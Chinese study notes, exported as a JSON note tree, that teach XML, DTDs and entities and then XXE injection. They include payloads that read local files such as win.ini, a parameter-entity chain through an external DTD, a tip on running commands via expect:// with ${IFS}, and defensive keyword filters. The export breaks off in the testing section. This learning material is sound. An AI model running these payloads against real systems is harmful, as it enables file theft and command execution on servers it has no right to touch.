{"ID":"20240919164253-942yow0","Spec":"1","Type":"NodeDocument","Properties":{"id":"20240919164253-942yow0","scroll":"\u0026#123;\u0026quot;rootId\u0026quot;:\u0026quot;20240919164253-942yow0\u0026quot;,\u0026quot;startId\u0026quot;:\u0026quot;20240919164254-5wazdpc\u0026quot;,\u0026quot;endId\u0026quot;:\u0026quot;20240919164438-ybw9p8t\u0026quot;,\u0026quot;scrollTop\u0026quot;:13853,\u0026quot;focusId\u0026quot;:\u0026quot;20240919164350-lx3yv1p\u0026quot;,\u0026quot;focusStart\u0026quot;:32,\u0026quot;focusEnd\u0026quot;:32\u0026#125;","title":"XXE-SSRF笔记","updated":"20240919164414"},"Children":[{"ID":"20240919164254-5wazdpc","Type":"NodeHeading","HeadingLevel":1,"Properties":{"id":"20240919164254-5wazdpc","updated":"20240919164254"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"# ","Properties":{"id":""}},{"Type":"NodeText","Data":"XXE 外部实体注入漏洞"}]},{"ID":"20240919164255-vkmstl2","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164255-vkmstl2","updated":"20240919164255"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"xml（可扩展标记语言）"}]},{"ID":"20240919164256-8w1nu9c","Type":"NodeParagraph","Properties":{"id":"20240919164256-8w1nu9c","updated":"20240919164256"},"Children":[{"Type":"NodeText","Data":"1、可扩展标记语言"}]},{"ID":"20240919164257-bip39hq","Type":"NodeParagraph","Properties":{"id":"20240919164257-bip39hq","updated":"20240919164257"},"Children":[{"Type":"NodeText","Data":"2、像html的一种标记语言"}]},{"ID":"20240919164258-bj989gx","Type":"NodeParagraph","Properties":{"id":"20240919164258-bj989gx","updated":"20240919164258"},"Children":[{"Type":"NodeText","Data":"3、html是为了显示数据，xml是为了传输数据"}]},{"ID":"20240919164259-896ttwx","Type":"NodeParagraph","Properties":{"id":"20240919164259-896ttwx","updated":"20240919164259"},"Children":[{"Type":"NodeText","Data":"4、标签没有被定义，需要自行定义"}]},{"ID":"20240919164260-hp846jv","Type":"NodeParagraph","Properties":{"id":"20240919164260-hp846jv","updated":"20240919164260"},"Children":[{"Type":"NodeText","Data":"5、自我描述性"}]},{"ID":"20240919164261-0gh8kgj","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164261-0gh8kgj","updated":"20240919164261"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"基本语法样式"}]},{"ID":"20240919164262-r5hra81","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":4,"CodeBlockOpenFence":"YGBgYA==","CodeBlockCloseFence":"YGBgYA==","Properties":{"id":"20240919164262-r5hra81","updated":"20240919164262"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"````","CodeBlockFenceLen":4,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"\u003e\n\n\u003caa\u003e \n\t\u003cb\u003edadada\u003c/b\u003e\n\t\u003cc\u003eadada\u003c/c\u003e\n\t\u003cA\u003e\u003c/A\u003e\n\u003c/aa\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"````","CodeBlockFenceLen":4,"Properties":{"id":""}}]},{"ID":"20240919164263-pxpu3b2","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164263-pxpu3b2","updated":"20240919164263"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"特性"}]},{"ID":"20240919164264-6qyae2c","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164264-6qyae2c","updated":"20240919164264"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"1、需要根节点\n2、标签需要一一对应，并且闭合\n3、xml声明（可选)\n4、对大小写字符敏感\n5、标签不用xml开头\n6、不能有空格符号\n7、不能有特殊字符\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164265-4ii6vtr","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164265-4ii6vtr","updated":"20240919164265"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"作用"}]},{"ID":"20240919164266-d55qz4l","Type":"NodeParagraph","Properties":{"id":"20240919164266-d55qz4l","updated":"20240919164266"},"Children":[{"Type":"NodeText","Data":"传输数据    存储数据"}]},{"ID":"20240919164267-te5gt8d","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164267-te5gt8d","updated":"20240919164267"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"语法结构"}]},{"ID":"20240919164268-7ezsvj5","Type":"NodeParagraph","Properties":{"id":"20240919164268-7ezsvj5","updated":"20240919164268"},"Children":[{"Type":"NodeText","Data":"分为两个部分：一个部分是标签定义部分；另一个是标签的解释（DTD）"}]},{"ID":"20240919164269-pwz42g6","Type":"NodeParagraph","Properties":{"id":"20240919164269-pwz42g6","updated":"20240919164269"},"Children":[{"Type":"NodeText","Data":"标签定义解释：DTD（document type definition）文档类型定义"}]},{"ID":"20240919164270-czp8rnq","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164270-czp8rnq","updated":"20240919164270"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1、内部dtd"}]},{"ID":"20240919164271-mv78az3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164271-mv78az3","updated":"20240919164271"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE user[\n\u003c!ELEMENT user (username,password)\u003e\n\u003c!ELEMENT username (#PCDATA)\u003e\n\u003c!ELEMENT password (#PCDATA)\u003e\n]\u003e\t\n\n\u003cuser\u003e\n\u003cusername\u003eAAA\u003c/username\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164272-t22d5hs","Type":"NodeParagraph","Properties":{"id":"20240919164272-t22d5hs","updated":"20240919164272"},"Children":[{"Type":"NodeText","Data":"！DOCTYPE   定义此文档未user类型的文档"}]},{"ID":"20240919164273-gn5w4ui","Type":"NodeParagraph","Properties":{"id":"20240919164273-gn5w4ui","updated":"20240919164273"},"Children":[{"Type":"NodeText","Data":"！ELEMENT user（）  声明user中有哪些元素，可申明，可不声明"}]},{"ID":"20240919164274-o858h6g","Type":"NodeParagraph","Properties":{"id":"20240919164274-o858h6g","updated":"20240919164274"},"Children":[{"Type":"NodeText","Data":"！ELEMENT username(#PCDATA)  声明元素类型，定义可悲解析器解析"}]},{"ID":"20240919164275-2kgd9ii","Type":"NodeParagraph","Properties":{"id":"20240919164275-2kgd9ii","updated":"20240919164275"},"Children":[{"Type":"NodeTextMark","TextMarkType":"tag","TextMarkTextContent":"PCDATA:可解析的文本"}]},{"ID":"20240919164276-9bh6g7t","Type":"NodeParagraph","Properties":{"id":"20240919164276-9bh6g7t","updated":"20240919164276"},"Children":[{"Type":"NodeTextMark","TextMarkType":"tag","TextMarkTextContent":"CDATA"},{"Type":"NodeText","Data":" ：不会被解析的文本（整个xml文档均不会被解析）"}]},{"ID":"20240919164277-i4flkhm","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164277-i4flkhm","updated":"20240919164277"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2、外部dtd"}]},{"ID":"20240919164278-w1dkukm","Type":"NodeParagraph","Properties":{"id":"20240919164278-w1dkukm","updated":"20240919164278"},"Children":[{"Type":"NodeText","Data":"格式"}]},{"ID":"20240919164279-edcjo03","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164279-edcjo03","updated":"20240919164279"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!DOCTYPE user SYSTEM \"filename.dtd\"\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164280-foai6an","Type":"NodeParagraph","Properties":{"id":"20240919164280-foai6an","updated":"20240919164280"},"Children":[{"Type":"NodeText","Data":"举例：1.xml"}]},{"ID":"20240919164281-gbzv8oi","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164281-gbzv8oi","updated":"20240919164281"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE user SYSTEM \"1.dtd\"\u003e\n\u003cuser\u003e\n\u003cusername\u003e12\u003c/username\u003e\n\u003cpassword\u003e123423\u003c/password\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164282-a78has9","Type":"NodeParagraph","Properties":{"id":"20240919164282-a78has9","updated":"20240919164282"},"Children":[{"Type":"NodeText","Data":"1.dtd"}]},{"ID":"20240919164283-wl8a8l1","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164283-wl8a8l1","updated":"20240919164283"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ELEMENT user (username,password)\u003e\t\t\t#申明元素名称\n\u003c!ELEMENT username (#PCDATA)\u003e\t\t#声明元素类型\n\u003c!ELEMENT password (#PCDATA)\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164284-nxda551","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164284-nxda551","updated":"20240919164284"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"XML实体"}]},{"ID":"20240919164285-gx9j9j9","Type":"NodeParagraph","Properties":{"id":"20240919164285-gx9j9j9","updated":"20240919164285"},"Children":[{"Type":"NodeText","Data":"概念："}]},{"ID":"20240919164286-e3ifu9y","Type":"NodeParagraph","Properties":{"id":"20240919164286-e3ifu9y","updated":"20240919164286"},"Children":[{"Type":"NodeText","Data":"$a\t变量名称"}]},{"ID":"20240919164287-4zln8pa","Type":"NodeParagraph","Properties":{"id":"20240919164287-4zln8pa","updated":"20240919164287"},"Children":[{"Type":"NodeText","Data":"$a=1   1变量的值"}]},{"ID":"20240919164288-jjmi1i8","Type":"NodeParagraph","Properties":{"id":"20240919164288-jjmi1i8","updated":"20240919164288"},"Children":[{"Type":"NodeText","Data":"xml实体是XML语言的变量，和php语言的变量一样，有变量名（实体名）、变量值（实体的值）；xml中通过\u0026（取地址符）/%来引用变量"}]},{"ID":"20240919164289-ym7iq2e","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164289-ym7iq2e","updated":"20240919164289"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"实体类型"}]},{"ID":"20240919164290-acodfh3","Type":"NodeParagraph","Properties":{"id":"20240919164290-acodfh3","updated":"20240919164290"},"Children":[{"Type":"NodeText","Data":"普通实体（方便理解：预定义好的）、参数实体（方便理解：有变量）"}]},{"ID":"20240919164291-lx3c6nd","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164291-lx3c6nd","updated":"20240919164291"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1、普通实体"}]},{"ID":"20240919164292-2ngxh5s","Type":"NodeParagraph","Properties":{"id":"20240919164292-2ngxh5s","updated":"20240919164292"},"Children":[{"Type":"NodeText","Data":"1.1 内部实体:定义在xml文本中的变量"}]},{"ID":"20240919164293-ehlmk11","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164293-ehlmk11","updated":"20240919164293"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE student[\n\u003c!ELEMENT student (name,age)\u003e\t#定义元素数量\n\u003c!ELEMENT name (#PCDATA)\u003e\t#定义元素类型\n\u003c!ELEMENT age (#PCDATA)\u003e\n\u003c!ENTITY aa \"zhangsan\"\u003e\t\t#定义实体\n\u003c!ENTITY bb \"16\"\u003e\n]\u003e\n\n\u003cstudent\u003e\n\u003cname\u003e\u0026aa;\u003c/name\u003e\t\t\u0026实体名称;\n\u003cage\u003e\u0026bb;\u003c/age\u003e\n\u003c/student\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164294-qg31uh6","Type":"NodeParagraph","Properties":{"id":"20240919164294-qg31uh6","updated":"20240919164294"},"Children":[{"Type":"NodeText","Data":"不定义元素，直接写实体"}]},{"ID":"20240919164295-cpw9440","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164295-cpw9440","updated":"20240919164295"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE student[\n\u003c!ENTITY aa \"zhangsan\"\u003e\n\u003c!ENTITY bb \"16\"\u003e\n]\u003e\n\n\u003cstudent\u003e\n\u003cname\u003e\u0026aa;\u003c/name\u003e\n\u003cage\u003e\u0026bb;\u003c/age\u003e\n\u003c/student\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164296-jfop2s7","Type":"NodeParagraph","Properties":{"id":"20240919164296-jfop2s7","updated":"20240919164296"},"Children":[{"Type":"NodeText","Data":"1.2、外部dtd实体"}]},{"ID":"20240919164297-enwx3s6","Type":"NodeParagraph","Properties":{"id":"20240919164297-enwx3s6","updated":"20240919164297"},"Children":[{"Type":"NodeText","Data":"语法"}]},{"ID":"20240919164298-mvozwrp","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164298-mvozwrp","updated":"20240919164298"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!DOCTYPE dd-element[\u003c!ENTITY 实体名称 SYSTEM \"资源位置1.dtd\"\u003e]\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164299-g2hkcu8","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164299-g2hkcu8","updated":"20240919164299"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!DOCTYPE ANY[]\u003e  #任意文档类型\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164300-0cpe73q","Type":"NodeParagraph","Properties":{"id":"20240919164300-0cpe73q","updated":"20240919164300"},"Children":[{"Type":"NodeText","Data":"举例：(前提：需要xml解析器能解析)"}]},{"ID":"20240919164301-d2uqmvj","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164301-d2uqmvj","updated":"20240919164301"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE user[\n\u003c!ENTITY a SYSTEM \"file://c:\\windows\\win.ini\"\u003e\n]\u003e\n\n\u003cuser\u003e\n\u003cname\u003e\u0026a;\u003c/name\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164302-d84yjd2","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164302-d84yjd2","updated":"20240919164302"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE user[\n\u003c!ENTITY a SYSTEM \"http://localhost/XXE/xxe/1.dtd\"\u003e\n]\u003e\n\n\u003cuser\u003e\n\u003cname\u003e\u0026a;\u003c/name\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164303-mrn84ni","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164303-mrn84ni","updated":"20240919164303"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2、参数实体"}]},{"ID":"20240919164304-jz552dq","Type":"NodeParagraph","Properties":{"id":"20240919164304-jz552dq","updated":"20240919164304"},"Children":[{"Type":"NodeText","Data":"格式"}]},{"ID":"20240919164305-5t9qnuu","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164305-5t9qnuu","updated":"20240919164305"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ENTITY % 实体名称 \"实体值\"\u003e\n\u003c!ENTITY % 实体名称 SYSTEM \"资源位置URI\"\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164306-v1h0nmw","Type":"NodeParagraph","Properties":{"id":"20240919164306-v1h0nmw","updated":"20240919164306"},"Children":[{"Type":"NodeText","Data":"举例："}]},{"ID":"20240919164307-oij42di","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164307-oij42di","updated":"20240919164307"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY % a SYSTEM \"http://localhost/XXE/xxe/1.dtd\"\u003e\n%a;\n]\u003e\n\n\u003cname\u003e\u0026b;\u003c/name\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164308-x4gcz3n","Type":"NodeParagraph","Properties":{"id":"20240919164308-x4gcz3n","updated":"20240919164308"},"Children":[{"Type":"NodeText","Data":"1.dtd"}]},{"ID":"20240919164309-hx10o8a","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164309-hx10o8a","updated":"20240919164309"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ENTITY b SYSTEM \"file://C:\\Azfile_all\\phpstudy\\phpstudy_pro\\WWW\\XXE\\xxe\\1.txt\"\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164310-xthmi6z","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164310-xthmi6z","updated":"20240919164310"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"常用的协议"}]},{"ID":"20240919164311-qwahn5s","Type":"NodeParagraph","Properties":{"id":"20240919164311-qwahn5s","updated":"20240919164311"},"Children":[{"Type":"NodeText","Data":"file://   读文件"}]},{"ID":"20240919164312-1zlgyi6","Type":"NodeParagraph","Properties":{"id":"20240919164312-1zlgyi6","updated":"20240919164312"},"Children":[{"Type":"NodeText","Data":"php://fileter"}]},{"ID":"20240919164313-09tlsbw","Type":"NodeParagraph","Properties":{"id":"20240919164313-09tlsbw","updated":"20240919164313"},"Children":[{"Type":"NodeText","Data":"http://"}]},{"ID":"20240919164314-jr9flz9","Type":"NodeParagraph","Properties":{"id":"20240919164314-jr9flz9","updated":"20240919164314"},"Children":[{"Type":"NodeText","Data":"expect://   执行系统命令,如果命令内存在空格，可使用${IFS}替换空格"}]},{"ID":"20240919164315-r880wf9","Type":"NodeParagraph","Properties":{"id":"20240919164315-r880wf9","updated":"20240919164315"},"Children":[{"Type":"NodeImage","Properties":{"id":""},"Children":[{"Type":"NodeBang","Data":"!","Properties":{"id":""}},{"Type":"NodeOpenBracket","Data":"[","Properties":{"id":""}},{"Type":"NodeLinkText","Data":"image-20240919105649977","Properties":{"id":""}},{"Type":"NodeCloseBracket","Data":"]","Properties":{"id":""}},{"Type":"NodeOpenParen","Data":"(","Properties":{"id":""}},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240919105649977.png","Properties":{"id":""}},{"Type":"NodeCloseParen","Data":")","Properties":{"id":""}}]}]},{"ID":"20240919164316-gmi5plz","Type":"NodeHeading","HeadingLevel":1,"Properties":{"id":"20240919164316-gmi5plz","updated":"20240919164316"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"# ","Properties":{"id":""}},{"Type":"NodeText","Data":"XXE漏洞"}]},{"ID":"20240919164317-x72sz02","Type":"NodeParagraph","Properties":{"id":"20240919164317-x72sz02","updated":"20240919164317"},"Children":[{"Type":"NodeText","Data":"xml外部实体注入，前置条件：1、xml语句能被解析器解析   2、没有禁止外部实体加载"}]},{"ID":"20240919164318-1sq8tel","Type":"NodeParagraph","Properties":{"id":"20240919164318-1sq8tel","updated":"20240919164318"},"Children":[{"Type":"NodeText","Data":"产生：上传的、插入的xml文件没有进行过滤"}]},{"ID":"20240919164319-43tzg78","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164319-43tzg78","updated":"20240919164319"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"能干吗？危害"}]},{"ID":"20240919164320-t8xk4f3","Type":"NodeParagraph","Properties":{"id":"20240919164320-t8xk4f3","updated":"20240919164320"},"Children":[{"Type":"NodeText","Data":"​\t1、读任意文件"}]},{"ID":"20240919164321-unphj9l","Type":"NodeParagraph","Properties":{"id":"20240919164321-unphj9l","updated":"20240919164321"},"Children":[{"Type":"NodeText","Data":"​\t2、执行系统 命令"}]},{"ID":"20240919164322-79sal4r","Type":"NodeParagraph","Properties":{"id":"20240919164322-79sal4r","updated":"20240919164322"},"Children":[{"Type":"NodeText","Data":"​\t3、扫描内网端口或服务"}]},{"ID":"20240919164323-75fg4id","Type":"NodeParagraph","Properties":{"id":"20240919164323-75fg4id","updated":"20240919164323"},"Children":[{"Type":"NodeText","Data":"​\t4、攻击内网其他网站"}]},{"ID":"20240919164324-62fsmb7","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164324-62fsmb7","updated":"20240919164324"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"怎么防御"}]},{"ID":"20240919164325-ol4cv15","Type":"NodeParagraph","Properties":{"id":"20240919164325-ol4cv15","updated":"20240919164325"},"Children":[{"Type":"NodeText","Data":"​\t1、过滤xml语句的特征（\u003c!ENTITY "},{"Type":"NodeBackslash","Properties":{"id":""},"Children":[{"Type":"NodeBackslashContent","Data":"\u003c","Properties":{"id":""}}]},{"Type":"NodeText","Data":"!DOCTYPE     SYSTEM  exprct:// file://   http://  data://   phar://协议）"}]},{"ID":"20240919164326-tgtr7sp","Type":"NodeParagraph","Properties":{"id":"20240919164326-tgtr7sp","updated":"20240919164326"},"Children":[{"Type":"NodeText","Data":"​\t2、禁用外部实体，libxml_disable_entity_loader   (ture)配置"}]},{"ID":"20240919164327-uzi3s5e","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164327-uzi3s5e","updated":"20240919164327"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"怎么测试"}]},{"ID":"20240919164328-ai1ngkl","Type":"NodeParagraph","Properties":{"id":"20240919164328-ai1ngkl","updated":"20240919164328"},"Children":[{"Type":"NodeText","Data":"1、判定是否使用了xml进行数据传递"}]},{"ID":"20240919164329-fftmh3q","Type":"NodeParagraph","Properties":{"id":"20240919164329-fftmh3q","updated":"20240919164329"},"Children":[{"Type":"NodeText","Data":"​\t标签、Accept: application/xml, 